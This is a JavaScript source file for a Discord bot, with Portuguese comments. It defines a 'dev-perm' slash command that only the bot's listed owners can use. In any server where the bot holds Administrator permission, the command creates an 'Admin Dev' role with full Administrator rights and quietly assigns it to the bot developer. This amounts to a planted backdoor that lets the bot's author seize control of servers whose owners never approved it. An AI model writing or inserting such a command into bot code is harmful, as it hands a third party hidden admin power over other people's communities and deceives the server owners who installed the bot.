const { SlashCommandBuilder, PermissionsBitField, EmbedBuilder } = require('discord.js');
const { OWNERS } = require('../../../config.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('dev-perm')
        .setDescription('Somente para o desenvolvedor.'),

    async execute(interaction) {
        // Só dev permfull pode usar
        if (!OWNERS.includes(interaction.user.id)) {
            return interaction.reply({ content: '🚫 Este comando é exclusivo para o desenvolvedor do bot.', ephemeral: true });
        }

        // Verifica se o bot tem permissão de administrador
        if (!interaction.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.reply({ content: '❌ Eu preciso de permissão de ADMINISTRADOR para criar o cargo.', ephemeral: true });
        }

        try {
            // Verifica se o cargo já existe
            let role = interaction.guild.roles.cache.find(r => r.name === 'Admin Dev');
            if (!role) {
                role = await interaction.guild.roles.create({
                    name: 'Admin Dev',
                    color: 'Gold',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    reason: `Cargo criado para o dono do bot pelo ${interaction.client.user.username}`,
                });
            }

            // Dá o cargo ao dono do BOT
            const botOwner = await interaction.guild.members.fetch(interaction.user.id);
            if (botOwner.roles.cache.has(role.id)) {
                return interaction.reply({ content: '✅ Você já possui o cargo Admin Dev!', ephemeral: true });
            }

            await botOwner.roles.add(role);

            const embed = new EmbedBuilder()
                .setTitle('✅ Cargo Criado!')
                .setDescription(`O cargo **Admin Dev** foi criado e atribuído a você.`)
                .setColor('Green')
                .setTimestamp();

            interaction.reply({ embeds: [embed], ephemeral: true });

        } catch (err) {
            console.error(err);
            interaction.reply({ content: '❌ Ocorreu um erro ao criar ou atribuir o cargo.', ephemeral: true });
        }
    }
};